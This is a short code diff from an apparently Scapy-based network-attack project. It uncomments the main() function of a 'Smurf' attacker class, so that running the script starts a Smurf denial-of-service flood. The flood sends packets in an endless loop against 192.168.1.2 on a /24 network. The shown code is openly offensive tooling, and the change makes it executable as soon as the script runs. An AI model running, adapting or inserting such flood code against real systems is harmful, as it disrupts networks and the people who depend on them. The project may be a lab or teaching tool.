@@ -52,11 +52,11 @@ class Smurf(AttackerBaseClass):
 		print("[*] SMURF attack started")
 		send(pkt, verbose=False, loop=True)
 
-# def main():
-# 	a = Smurf("192.168.1.2", "24")
-# 	a.print_broadcast_addr()
-# 	a.print_target_ip()
-# 	a.start()
+def main():
+	a = Smurf("192.168.1.2", "24")
+	a.print_broadcast_addr()
+	a.print_target_ip()
+	a.start()
 
-# if __name__ == "__main__":
-# 	main()
+if __name__ == "__main__":
+	main()
